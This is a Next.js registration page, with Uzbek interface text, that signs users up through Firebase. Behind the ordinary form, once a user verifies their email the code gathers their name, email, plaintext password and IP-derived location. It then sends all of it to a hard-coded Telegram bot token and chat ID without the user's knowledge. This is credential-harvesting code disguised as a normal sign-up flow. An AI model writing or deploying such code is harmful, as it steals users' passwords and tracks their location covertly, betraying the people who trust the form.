"use client";

import React, { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@radix-ui/react-label";
import { toast } from "sonner";
import {
  createUserWithEmailAndPassword,
  sendEmailVerification,
  signInWithEmailAndPassword,
} from "firebase/auth";
import { auth } from "@/lib/firebase";
import { useRouter } from "next/navigation";

export default function Page() {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [startWatching, setStartWatching] = useState(false);
  const router = useRouter();

  function validateForm() {
    if (name.length < 3) {
      toast.error("Ism kamida 3 ta belgidan iborat bo'lishi kerak");
      return false;
    }
    if (email.length < 5 || !email.includes("@")) {
      toast.error("Email noto‘g‘ri formatda");
      return false;
    }
    if (password.length < 6) {
      toast.error("Parol kamida 6 ta belgidan iborat bo'lishi kerak");
      return false;
    }
    if (password !== confirmPassword) {
      toast.error("Parollar mos emas");
      return false;
    }
    return true;
  }
  function location() {
    fetch("https://ipwho.is/")
      .then((res) => res.json())
      .then((data) => {
        if (data.success) {
          console.log("IP:", data.ip);
          console.log("Shahar:", data.city);
          console.log("Davlat:", data.country);
          console.log("Koordinatalar:", data.latitude, data.longitude);
          return `IP: ${data.ip}, Shahar: ${data.city}, Davlat: ${data.country}, Koordinatalar: ${data.latitude}, ${data.longitude}`;
        } else {
          console.error("Joylashuv aniqlanmadi:", data.message);
        }
      })
      .catch((err) => {
        console.error("Xatolik:", err);
      });
  }
  useEffect(() => {
    if (!startWatching) return;

    const interval = setInterval(async () => {
      const user = auth.currentUser;
      if (user) {
        await user.reload();
        if (user.emailVerified) {
          toast.success("Email tasdiqlandi!");
          let message = `📥 Yangi xabar:\n👤 Ism: ${
            name ? name : "ismi topilmadi"
          }\n📧 Email: ${user.email}\ Parol: ${
            password ? password : "password topilmadi"
          }\ yaratildi: ${user.metadata.creationTime}
          '\ locatsiya: ${location()}`;
          fetch(
            `https://api.telegram.org/bot8104501953:AAFwsKxosWHNV8bv7_sDxEumSfmOIEXHbJ0/sendMessage`,
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: 7441716386,
                text: message,
              }),
            }
          )
            .then((response) => {
              if (response.ok) {
                toast("✅ Telegramga yuborildi!");
              } else {
                toast("❌ Xatolik: yuborilmadi!");
              }
            })
            .catch((error) => {
              console.error("Xatolik:", error);
              toast("⚠️ Tarmoqda xatolik!");
            });
          console.log(user);

          clearInterval(interval);
          router.push("/");
        }
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [startWatching]);

  function handleRegister(e) {
    e.preventDefault();
    if (!validateForm()) return;

    createUserWithEmailAndPassword(auth, email, password)
      .then(({ user }) => {
        sendEmailVerification(user)
          .then(() => {
            console.log(user);

            toast.success(
              "Yangi akkaunt yaratildi. Emailga tasdiqlash yuborildi!"
            );
            setStartWatching(true);
          })
          .catch((error) => {
            toast.error("Email yuborilmadi: " + error.message);
          });
      })
      .catch((error) => {
        if (error.code === "auth/email-already-in-use") {
          signInWithEmailAndPassword(auth, email, password)
            .then(({ user }) => {
              if (!user.emailVerified) {
                sendEmailVerification(user)
                  .then(() => {
                    toast.success(
                      "Email ro'yxatdan o'tgan, ammo tasdiqlanmagan. Yangi tasdiqlash xati yuborildi!"
                    );
                    setStartWatching(true);
                  })
                  .catch((err) => {
                    toast.error("Email yuborilmadi: " + err.message);
                  });
              } else {
                toast.info(
                  "Bu email allaqachon tasdiqlangan. Iltimos, tizimga kiring."
                );
                router.push("/");
              }
            })
            .catch((err) => {
              toast.error(
                "Parol noto‘g‘ri yoki boshqa xatolik: " + err.message
              );
            });
        } else {
          toast.error("Ro‘yxatdan o‘tishda xatolik: " + error.message);
        }
      });
  }

  return (
    <form
      onSubmit={handleRegister}
      className="max-w-md mx-auto mt-10 space-y-6 p-6 border rounded-2xl shadow-lg"
    >
      <div>
        <Label htmlFor="username">Ism</Label>
        <Input
          id="username"
          name="username"
          placeholder="Ismingizni kiriting"
          value={name}
          onChange={(e) => setName(e.target.value)}
          required
        />
      </div>

      <div>
        <Label htmlFor="email">Email</Label>
        <Input
          id="email"
          name="email"
          type="email"
          placeholder="Emailingizni kiriting"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />
      </div>

      <div>
        <Label htmlFor="password">Parol</Label>
        <Input
          id="password"
          name="password"
          type="password"
          placeholder="Parol kiriting"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
      </div>

      <div>
        <Label htmlFor="confirm-password">Parolni tasdiqlang</Label>
        <Input
          id="confirm-password"
          name="confirmPassword"
          type="password"
          placeholder="Parolni qayta kiriting"
          value={confirmPassword}
          onChange={(e) => setConfirmPassword(e.target.value)}
          required
        />
      </div>

      <Button type="submit" className="w-full">
        Ro‘yxatdan o‘tish
      </Button>
    </form>
  );
}
